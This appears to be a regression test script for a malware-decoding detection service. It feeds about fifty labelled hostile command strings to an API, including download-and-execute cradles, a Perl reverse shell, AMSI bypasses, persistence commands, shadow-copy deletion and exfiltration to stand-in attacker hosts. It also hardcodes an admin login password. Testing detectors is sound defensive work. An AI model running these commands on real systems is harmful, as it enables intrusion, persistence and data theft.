"""NivXRay · Daily Extensive Regression — Feb 2026

Feeds 50+ payloads through /api/decode/smart and generates a
Markdown + JSON report saved to /app/frontend/public/downloads/.

Run daily: `python3 /app/backend/tests/daily_regression.py`
"""
import base64
import gzip
import json
import os
import time
from datetime import datetime

import requests

API = os.popen('grep REACT_APP_BACKEND_URL /app/frontend/.env | cut -d= -f2').read().strip()
TOK = os.popen(
    f"""curl -s -X POST {API}/api/auth/login -H 'Content-Type: application/json' """
    """-d '{"email":"admin@nivxray.com","password":"uulVDp5cCSB3Hva99s7UUAwK"}' """
    """| python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" """
).read().strip()
H = {"Authorization": f"Bearer {TOK}"}


def b64(s):
    return base64.b64encode(s.encode("utf-16-le")).decode()


def b64a(s):
    return base64.b64encode(s.encode()).decode()


def gz_b64(s):
    return base64.b64encode(gzip.compress(s.encode())).decode()


# Build payloads without f-string-with-backslash bugs
CASES = []
_add = CASES.append

# A · Classic single-layer encoded
_add({"label": "A1 · PS -EncodedCommand short", "input": "powershell -EncodedCommand " + b64("Write-Host hello")})
_add({"label": "A2 · PS -Enc IEX DownloadString", "input": "powershell -NoP -W Hidden -EncodedCommand " + b64("IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/x.ps1')")})
_add({"label": "A3 · PS -e DownloadFile+Start-Process", "input": "powershell -e " + b64("$w=New-Object Net.WebClient; $w.DownloadFile('http://evil/y.exe','y.exe'); Start-Process y.exe")})
_add({"label": "A4 · PS AMSI reflection short", "input": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"})
_add({"label": "A5 · CMD /c PS chain", "input": "cmd.exe /c \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/y.ps1')\""})

# B · Multi-layer nested
_add({"label": "B1 · b64 → utf16le → PS concat AMSI", "input": "powershell -Enc " + b64("S`eT-It`em('V'+'aR')(('Am'+'si'));curl.exe https://10.2.27.30")})
_add({"label": "B2 · b64 → gzip → shell curl", "input": "echo '" + gz_b64("curl -fsSL http://x.io/x.sh | bash") + "' | base64 -d | gunzip | bash"})
_add({"label": "B3 · CS byte-array shellcode loader", "input": "[Byte[]]$var_code=[System.Convert]::FromBase64String('" + b64a("A" * 250) + "'); VirtualAlloc(0,$var_code.Length,0x3000,0x40)"})
_add({"label": "B4 · Nested b64 double-wrap", "input": "powershell -Enc " + b64("powershell -Enc " + b64("Write-Host inner"))})
_add({"label": "B5 · Bash flock + wget + b64", "input": "( flock -x 200; wget -qO- http://x.io/loader | base64 -d | bash ) 200>/tmp/l.lock"})
_add({"label": "B6 · CMD→PS→IEX→download→exec", "input": "cmd /c powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://a/b.ps1')); Start-Process $env:TEMP\\d.exe\""})
_add({"label": "B7 · PS bxor loop XOR", "input": "$s=[Convert]::FromBase64String('AAAA'); for($i=0;$i-lt$s.Length;$i++){$s[$i]=$s[$i]-bxor 0x2A}"})
_add({"label": "B8 · PS char-code assembly", "input": "-join(([char[]](116,101,115,116)))"})

# C · Fragment-mode
_add({"label": "C1 · Fragment -EncodedCommand", "input": "-EncodedCommand " + b64("Get-Process")})
_add({"label": "C2 · Fragment /c rundll32 comsvcs", "input": "/Q /c \"for /f %A in ('tasklist') do rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #+000024 %A\""})
_add({"label": "C3 · Fragment certutil -urlcache", "input": "-urlcache -split -f http://evil/x.exe C:\\Users\\Public\\x.exe"})
_add({"label": "C4 · Fragment bitsadmin transfer", "input": "/transfer job http://evil/loader.exe C:\\Windows\\Temp\\l.exe"})
_add({"label": "C5 · Fragment schtasks", "input": "/create /tn Updater /tr \"C:\\Users\\Public\\p.exe\" /sc onlogon"})
_add({"label": "C6 · Fragment reg run key", "input": "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\p.exe /f"})
_add({"label": "C7 · Fragment vssadmin", "input": "delete shadows /all /quiet"})
_add({"label": "C8 · Fragment comsvcs ordinal", "input": "C:\\Windows\\System32\\comsvcs.dll, #+000024 1076 \\Windows\\Temp\\m.dmp full"})

# D · Cross-platform
_add({"label": "D1 · Linux curl | bash", "input": "curl -fsSL http://x/y.sh | bash"})
_add({"label": "D2 · Linux wget | sh", "input": "wget -qO- http://x/y.sh | sh"})
_add({"label": "D3 · Linux nohup bg", "input": "nohup /tmp/x >/dev/null 2>&1 &"})
_add({"label": "D4 · Linux crontab persistence", "input": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/x.sh') | crontab -"})
_add({"label": "D5 · macOS osascript loader", "input": "osascript -e 'do shell script \"curl http://x/y.sh | bash\"'"})
_add({"label": "D6 · macOS LaunchAgent load", "input": "launchctl load ~/Library/LaunchAgents/com.evil.updater.plist"})
_add({"label": "D7 · Python b64 exec", "input": "python -c \"import base64;exec(base64.b64decode('" + b64a("import os;os.system('id')") + "'))\""})
_add({"label": "D8 · Perl reverse shell", "input": "perl -e 'use Socket;$i=\"1.2.3.4\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'"})

# E · LOLBAS
_add({"label": "E1 · certutil download", "input": "certutil.exe -urlcache -split -f https://evil/x.exe %TEMP%\\x.exe"})
_add({"label": "E2 · mshta remote", "input": "mshta.exe http://evil/x.hta"})
_add({"label": "E3 · rundll32 JS", "input": "rundll32.exe javascript:document.write('load')"})
_add({"label": "E4 · regsvr32 SCT", "input": "regsvr32.exe /s /n /u /i:http://evil/xxx.sct scrobj.dll"})
_add({"label": "E5 · InstallUtil", "input": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\payload.dll"})
_add({"label": "E6 · Msbuild inline", "input": "msbuild.exe C:\\Users\\Public\\evil.csproj"})
_add({"label": "E7 · Bitsadmin", "input": "bitsadmin /transfer myJob /download http://evil/x.exe C:\\x.exe"})
_add({"label": "E8 · Wmic remote spawn", "input": "wmic /node:\"192.168.1.10\" process call create \"powershell -c IEX\""})

# F · Impact / Lateral / Exfil / Collection
_add({"label": "F1 · Impact ransomware precursor", "input": "vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & wevtutil cl Security"})
_add({"label": "F2 · Lateral PsExec SMB", "input": "psexec.exe \\\\FILESRV -s cmd.exe /c \"copy evil.exe \\\\FILESRV\\C$\\Windows\\Temp\\\""})
_add({"label": "F3 · Exfil IWR POST", "input": "Invoke-WebRequest -Uri http://exfil.example/upload -Method POST -InFile C:\\loot.zip"})
_add({"label": "F4 · Exfil aws s3 cp", "input": "aws s3 cp secrets.tar.gz s3://attacker-bucket/loot/"})
_add({"label": "F5 · Collection archive + IWR", "input": "Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath loot.zip; iwr -Uri http://x/u -Method POST -InFile loot.zip"})
_add({"label": "F6 · Collection clipboard", "input": "Get-Clipboard | Out-File $env:TEMP\\clip.txt"})
_add({"label": "F7 · Exfil DNS tunnel", "input": "nslookup " + ("a" * 40) + ".exfil.example.com"})

# G · Cloud / novel
_add({"label": "G1 · GCP svc-account JWT", "input": "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJzdmMtYWNjb3VudEBteS1wcm9qZWN0LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwic2NvcGUiOiJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL2Nsb3VkLXBsYXRmb3JtIn0.SIG"})
_add({"label": "G2 · AWS Cognito ID token", "input": "eyJraWQiOiJmZDU3IiwiYWxnIjoiUlMyNTYifQ.eyJjb2duaXRvOnVzZXJuYW1lIjoidmljdGltQHRhcmdldC5jb20ifQ.SIG"})
_add({"label": "G3 · Ngrok tunnel C2", "input": "ssh -R 22:localhost:22 tunnel@1.tcp.ngrok.io -p 12345 -N"})
_add({"label": "G4 · ClickFix Azure Blob", "input": "powershell -w h -c \"iwr http://legit.blob.core.windows.net/tools/updater.ps1 -UseBasicParsing | iex\""})

# H · Benign / negative controls
_add({"label": "H1 · Benign hostname", "input": "WIN10-DEV-42"})
_add({"label": "H2 · Benign echo", "input": "echo Hello World"})
_add({"label": "H3 · Benign var assignment", "input": "$x = 'production'"})
_add({"label": "H4 · JSON debris", "input": "],"})

print(f"Total cases: {len(CASES)}")

# ─── Run ───
results = []
t0 = time.time()
for i, c in enumerate(CASES, 1):
    try:
        r = requests.post(f"{API}/api/decode/smart", headers=H,
                          json={"input": c["input"]}, timeout=30)
        d = r.json() if r.status_code == 200 else {"error": r.text[:150]}
        mitre = d.get("mitre") or []
        lolbas = d.get("lolbas") or []
        iocs = d.get("iocs") or {}
        risk = d.get("risk") or {}
        chain = d.get("chain_ids") or d.get("chain") or []
        out = d.get("output") or ""
        results.append({
            "n": i, "label": c["label"], "input_snippet": c["input"][:80],
            "status": r.status_code, "engine": d.get("engine", "?"),
            "score": d.get("score"), "verdict": risk.get("verdict"),
            "level": risk.get("level"), "reached_shellcode": d.get("reached_shellcode"),
            "chain": chain if isinstance(chain, list) else [chain],
            "mitre_count": len(mitre),
            "mitre_ids": [m.get("id") for m in mitre],
            "lolbins": [l.get("binary") for l in lolbas],
            "iocs_urls": iocs.get("urls", []),
            "iocs_ips": iocs.get("ips", []),
            "output_len": len(out),
        })
    except Exception as e:
        results.append({"n": i, "label": c["label"], "error": str(e)[:200]})

elapsed = time.time() - t0
today = datetime.utcnow().strftime("%Y-%m-%d")
os.makedirs("/app/frontend/public/downloads", exist_ok=True)

# ─── Save JSON ───
json_path = f"/app/frontend/public/downloads/regression_{today}.json"
with open(json_path, "w") as f:
    json.dump({"date": today, "total": len(results),
               "elapsed_sec": round(elapsed, 2), "results": results},
              f, indent=2, default=str)

# ─── Build Markdown report ───
lines = []
w = lines.append
w(f"# NivXRay · Daily Regression Report · {today}")
w("")
w(f"- **Total cases**: {len(results)}")
w(f"- **Runtime**: {elapsed:.1f}s ({elapsed / len(results):.2f}s per case)")
w("")

malicious = sum(1 for r in results if (r.get("level") or "").lower() in ("high", "critical", "malicious"))
suspicious = sum(1 for r in results if (r.get("level") or "").lower() in ("medium", "suspicious"))
zero_mitre_bad = sum(1 for r in results
                     if r.get("mitre_count", 0) == 0 and not r["label"].startswith("H"))
shellcode = sum(1 for r in results if r.get("reached_shellcode"))
benign_false = sum(1 for r in results
                   if r["label"].startswith("H") and r.get("mitre_count", 0) > 0)

w("## Verdict distribution")
w(f"- Malicious : **{malicious}** / {len(results)}")
w(f"- Suspicious : **{suspicious}** / {len(results)}")
w(f"- Reached shellcode : **{shellcode}** / {len(results)}")
w(f"- Zero-MITRE (excluding benign controls) : **{zero_mitre_bad}** ← detection gaps")
w(f"- Benign false positives (H* got MITRE tags) : **{benign_false}** ← noise")
w("")

w("## Per-case results")
w("")
w("| # | Label | Verdict | Score | MITRE ct | Chain (first 3) | Shellcode |")
w("|---|---|---|---|---|---|---|")
for r in results:
    if "error" in r:
        w(f"| {r['n']} | {r['label']} | ERROR: {r['error'][:60]} | — | — | — | — |")
        continue
    chain = "→".join((r.get("chain") or [])[:3]) or "—"
    w(f"| {r['n']} | {r['label']} | {r.get('level') or '—'} | {r.get('score') or '—'} | {r.get('mitre_count')} | `{chain[:60]}` | {'✅' if r.get('reached_shellcode') else '—'} |")

w("")
w("## Detection gaps (zero-MITRE non-benign)")
for r in results:
    if r.get("mitre_count", 0) == 0 and not r["label"].startswith("H"):
        w(f"- `{r['label']}` — input: `{r.get('input_snippet','?')[:70]}`")

w("")
w("## Benign false-positives (should be zero)")
for r in results:
    if r["label"].startswith("H") and r.get("mitre_count", 0) > 0:
        w(f"- `{r['label']}` — got {r.get('mitre_count')} MITRE tags · IDs: {r.get('mitre_ids')}")

md_path = f"/app/frontend/public/downloads/regression_{today}.md"
with open(md_path, "w") as f:
    f.write("\n".join(lines))

print(f"\nJSON : {json_path}")
print(f"MD   : {md_path}")
print(f"\nSummary: {malicious} malicious · {suspicious} suspicious · {shellcode} shellcode · {zero_mitre_bad} gaps · {benign_false} FP")
